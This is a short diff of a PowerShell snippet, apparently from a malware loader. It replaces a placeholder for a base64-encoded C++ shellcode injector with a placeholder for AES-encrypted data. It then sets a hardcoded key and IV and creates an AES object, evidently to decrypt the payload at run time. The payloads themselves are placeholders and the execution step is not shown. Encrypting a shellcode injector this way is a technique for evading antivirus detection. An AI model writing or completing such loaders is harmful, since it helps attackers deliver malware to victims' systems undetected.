@@ -1,4 +1,4 @@
-$data=[Convert]::FromBase64String('<base64 encoded CPP shellcode injector>');
+$data=[Convert]::FromBase64String('<base64_AES_encrpyted>');
 $iv='abcdefghijklmnop';
 $key='q3By2ZFhFis1iZWe'.PadRight(16, [char]0);
 $aes=[System.Security.Cryptography.Aes]::Create();
